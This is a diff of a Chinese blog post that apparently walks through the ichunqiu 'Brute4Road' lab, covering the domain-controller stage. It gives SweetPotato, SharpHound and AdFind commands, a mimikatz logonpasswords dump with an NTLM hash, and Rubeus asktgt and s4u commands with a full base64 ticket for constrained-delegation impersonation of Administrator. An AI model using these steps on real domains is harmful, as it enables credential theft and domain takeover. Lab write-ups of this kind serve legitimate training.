@@ -41,11 +41,18 @@
 <meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-9.png">
 <meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-10.png">
 <meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-11.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-15.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-18.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-16.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-17.png">
 <meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-12.png">
 <meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-14.png">
 <meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-13.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-19.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-20.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-21.png">
 <meta property="article:published_time" content="2025-10-29T09:00:00.000Z">
-<meta property="article:modified_time" content="2025-11-04T15:50:31.541Z">
+<meta property="article:modified_time" content="2026-05-10T09:51:14.558Z">
 <meta property="article:author" content="dr0n">
 <meta property="article:tag" content="专业徽章">
 <meta property="article:tag" content="内网渗透">
@@ -435,7 +442,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          10k 字
+          11k 字
         
       </span>
     
@@ -446,7 +453,7 @@
         
         
         
-          77 分钟
+          79 分钟
         
       </span>
     
@@ -564,18 +571,29 @@
 <p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-10.png" srcset="/img/loading.gif" lazyload></p>
 <h2 id="DC（172-22-2-3）"><a href="#DC（172-22-2-3）" class="headerlink" title="DC（172.22.2.3）"></a>DC（172.22.2.3）</h2><p>systeminfo查看信息，在 xiaorang.lab 域中</p>
 <p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-11.png" srcset="/img/loading.gif" lazyload></p>
-<p>bloodhound 或者 AdFind 分析发现 MSSQLSERVER 配置了到 DC LDAP 和 CIFS 服务的约束性委派</p>
-<p>mimikatz 读取域用户哈希</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz.exe <span class="hljs-string">&quot;&quot;</span>privilege::debug<span class="hljs-string">&quot;&quot;</span> <span class="hljs-string">&quot;&quot;</span>sekurlsa::logonpasswords<span class="hljs-string">&quot;&quot;</span> <span class="hljs-built_in">exit</span><br><br><br>Username : MSSQLSERVER$<br>Domain   : XIAORANG<br>NTLM     : 6cc34f4dd588e5adafca81c80b69b400<br></code></pre></td></tr></table></figure>
+<p>使用 bloodhound 或者 AdFind 分析域</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:/Users/Public/SweetPotato.exe -a <span class="hljs-string">&quot;C:/Users/Public/SharpHound.exe -c all --OutputDirectory C:/Users/Public/&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-15.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-18.png" srcset="/img/loading.gif" lazyload></p>
+<p>AdFind 的命令太长可以放在bat中执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Users\Public\SweetPotato.exe -a <span class="hljs-string">&quot;cmd /c C:\Users\Public\1.bat&quot;</span><br></code></pre></td></tr></table></figure>
 
 
-<p>用 Rubeus 申请用户 MSSQLSERVER$ 的 TGT 票据</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:6cc34f4dd588e5adafca81c80b69b400 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap &gt; 1.txt<br></code></pre></td></tr></table></figure>
+<p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-16.png" srcset="/img/loading.gif" lazyload></p>
+<p>结合上面 bloodhound 的结果可以确认 MSSQLSERVER 配置了到 DC LDAP 和 CIFS 服务的约束性委派</p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-17.png" srcset="/img/loading.gif" lazyload></p>
+<p>mimikatz 读取 MSSQLSERVER 的哈希</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz.exe <span class="hljs-string">&quot;&quot;</span>privilege::debug<span class="hljs-string">&quot;&quot;</span> <span class="hljs-string">&quot;&quot;</span>sekurlsa::logonpasswords<span class="hljs-string">&quot;&quot;</span> <span class="hljs-built_in">exit</span><br><br><br>Username : MSSQLSERVER$<br>Domain   : XIAORANG<br>NTLM     : 6c22ca9683e60f12d337d8f0cb0c2427<br></code></pre></td></tr></table></figure>
+
+
+<p>用 Rubeus 申请用户 MSSQLSERVER 的 TGT 票据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:6c22ca9683e60f12d337d8f0cb0c2427 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap &gt; 1.txt<br></code></pre></td></tr></table></figure>
 
 <p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-12.png" srcset="/img/loading.gif" lazyload></p>
 <p>复制票据的base64编码</p>
 <p>然后通过 Rubeus 的 S4U2Self 协议代表域管理员申请针对域控 CIFS 服务的票据并注入内存</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE1+MrNLJf8hRPsIS+pUx5K9ioqtOAGCjQQT1EtKEmTxLmCMkeggjLnQD9TMVCj03VM2dhUMu4TDuJPkzAjbU6NDwC9EbOy72906qkgch7Oiu+WW1t9kGzKyjtsKBJdeYBn6260lFHca8sVYUEE0/WfbIrst8HQgY1HuPg4vJcLM1jwFAjlSyY4VPTGDvYBuspDq4t8oDKU5xGfuvDb1iM5IC9kgG0pdTzVLj2OLl/nG40eMhDnpqPd40X25PRxJsVRfSqY1N0M7GGzkke7SipoMUTo6M7FFwFfO6Ixo+8XIkEzWS5bvSw/1vSNBv+gJorQcaShM4m+nphIRLhDxNIF7Dhg4WNKt/9T8qldof4GrQO6RZRMbwc1d1byHRfDZ7DEsZjpI8IODUQNz55/L1sVKkUZ79DrSpcmph9S5hbesucMYPBKwmNzdYvslzpSIifDh4bGyeByjPvzHxUrbTgYOd+A9pRrYFq7RYUC+lEiz4kLrpHjrQh1wQV6K0GtTqJwbPQ5G2TA3gN1iAnRBcLqwCYYEfAk0rOheYOcQeo7vXAVwC0EuTvzXtwgzbHbgcBxnJfdJMkkIFuEHLY7Ss6mKJCorVc6tgfuZN+9I7qh4uREJMpPNDSPvzMpQivWgZl+Za4sTEgHgg4h67R9wNxv1C8GmHyDdDnlMzbcz5aJXSJX43ZcR9lWlaV/HSz3eknqmGDmWqKRVEk6wX6v46DYgHzvH9Dmx2o3bx5QXEJk8kAh3zCcqwfbstUF4DbKEHBKE7dtYeFl8tpmxuZRvs5PmAWopr1Wc56p++5nBn1Ou3TW6OVUtSl9b+foUSmxSNogPYuoIOHzUGRa3kHWYJ+EXbFlmxK8BhqDP40qzoZsK82zxW/ylOtGH1oFG3mozq5zCecE+ShTbNK5tkhDt5u5QMdjrNd6f/xkzZlQ0sMERaLNmBd+FHwut816ny3dj2M2QjKGVkjom6i4nhhBQZ97Pmmf5b+E4C9yYdoWTrmujwYrJLrlK3N5VXnPr7r8bQzHTrC20uTF7zdNimiJcISMaKC8TKWzaJ5FCW03+z8uRA+itb2pv1Xjk1kk9QMDm2uHJUd9lUUhxv/waDL510I361SHOl2cxj+XgY6Zb29VnIwT4Z/sV+54EdN1HAmQpQE8H1bhIXOevnS5tbeWLwLrwNPtV9DO+Pwo/ZAdYQdqjEdNXryQdDjflubFVvy3Vhbt7knOJTtpabOrpBXN1y2i6sLmo0ukm2vT0JHL7lqa37fyfcJYCeqw7PBGIfMDVwjHFporzmbCBKUVuh0p9NBzMifdKNXWmS5R0orIM12K42ZaK5SC59AAVFhEXxNVu7yyhHQIVwoR7IOBlRpFfPJvc60e9hyCrxxjyAMjNp2zHFhdosGWf6yWywxAkMlFvQkjXIfWGSWpUCKUguMLG+jMRc4ShgPAgnr0+DsCxU8fXrmwbcMnQcgYrWay7ksijgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBDs2Z1w7FALNmP9KIeq+tISoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MTAyOTEzNTg0M1qmERgPMjAyNTEwMjkyMzU4NDNapxEYDzIwMjUxMTA1MTM1ODQzWqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE2UZsz51f6XwWZgrbdaVo1V2abH+KEj7wsXhWsB3Ub9BvfHJPgCtOxY6W4QJ6BxVLINk8DNrpOzG4IjOpJAxxVWmLQJtTmAZQaY0Sai1/MC+10FQAyqM+JF7sCjgyG1oLyttjMtyvwzGlggtT2By5Gq23RoJ99eJOzSa2khfCy1oYjaJwGBmpOElX3bEea/t2/4pD36td+paA7KgZ3hHnej7NnObQ9XDe8tR6LhsWrGibw73gjD7Uv9IkFyRFDWZJKdaBdv3y1ee1VSrf19cSZx61Cp8aAAecpBO+9Y3fLLuAqEGjVnl8oxOnXxNQjO/z9MRXiSUd7wkI8RR5i36uWi50QHlW8PbP5pqKnUaYE/mJHUEvmrSfpEw0qaJOn/2WL15k7kGbGKAa6RuNIPQALDwkm9Pum1U6+ZS6EfZ2SfytjrBM9NGy6JVVf7zQA9UEDCP1vXyAOZkp42xEqwvf01lYL1bk3NBIGX2BgYNCu+nSWm9yHlxwLbk0ZndCCGEh8tIYXD4C+WpWvuLJnWZ5yVO+7y0f8tluncZXdl+k2Sj9hHbwaa0Epu+0OR8vkdHeFJke0/S7mW41lpgwi/TxucB+Jvwkk/bpcfKWQpbuQlGIOPqsswzxIv4pND8u9KhLZDWchx4ObrW1GwLXFvK1PEXn0/1cn+c8Vf4MKVwtwih9qw7PsPImIIHXAVQ5/iO7swJzvFBGaurw0SSpPWFsVz1ns/wXOyYZpTrRWWuRWjwQ1yNi2IGE7Tmkoooe3sqFDTE7RFdxlCplICPhPYVI82GJxRDqgxatU9f/4wpMBlp+IN2WLmRgLQ/jyr9Jte/OTeF6d9cYx4aSQI6Fh0GdHBwmAwVbiA5r2a3LKSoC+V/1k4Kz+uKofmY0SPu63/h+RV8sJnPCU1/u5l1R5Gd3Fnju5hdXbV3nRBtD2ZxUhgsymnvY9tUVA7fen8LQvjAxxfaodPZSmYzUzzxhak1MGHvPnCe/ghmvoCHTPs8ySTyqsmAEwfj1fK72gR5tppaJeWNTwTp/GSbgKQM2LWVmroUA7Get2DALprTISFDa2BqKOGGUyfZki83Mvk1adgtryNFRJ4VDdzei8Q2yVPLFyz3+wQPLoOsn9romHFNX6ktiH/NdTTXOrvI8ynMEQQJvIkeQf0L+mMVDk+ZaxoW1cT2FWBWpWf+o2t58QahSqRthdT5aUMoLDieApyONtdPRHhJqKvN0xyYzLuoYAaCax0hlW3IRHNK+l+sgrZ6rpw80oQ3kAwF1xKSRudGxS0NQllpMiyZ+g9wauqv94/xn/myPJbZlgzt0xU7wmivCyYI+VH4DIdGhMTbLvi/+rOkUKaqRmNHdR4/0V2w4YytFwqeydA2ZDC+anZwAtyISygAuzPQfJzrwsHT3Wk1j0CV/ATQNk4RJLucdMmG2xMqps1BAWQ3Sndr09T38x/RosGbjuTiL7posPB3dxM3qujgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBACQhFwKF4mds/ukaxelEfMoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI2MDUxMDA5MTkwNlqmERgPMjAyNjA1MTAxOTE5MDZapxEYDzIwMjYwNTE3MDkxOTA2WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==<br></code></pre></td></tr></table></figure>
 
 
 <p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-14.png" srcset="/img/loading.gif" lazyload></p>
@@ -583,7 +601,11 @@
 <figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-built_in">type</span> \\DC.xiaorang.lab\C$\Users\Administrator\flag\flag04.txt<br></code></pre></td></tr></table></figure>
 
 <p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-13.png" srcset="/img/loading.gif" lazyload></p>
-<p>或者利用 LDAP 服务，然后通过DCSync拿到管理员的hash 然后pth</p>
+<hr>
+<p>或者利用 LDAP 服务，然后通过 DCSync 拿到管理员的 hash 然后pth</p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-19.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-20.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Brute4Road-21.png" srcset="/img/loading.gif" lazyload></p>
 
                 
               </div>
@@ -652,7 +674,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2025年11月4日</div>
+          <div>2026年5月10日</div>
         </div>
       
       
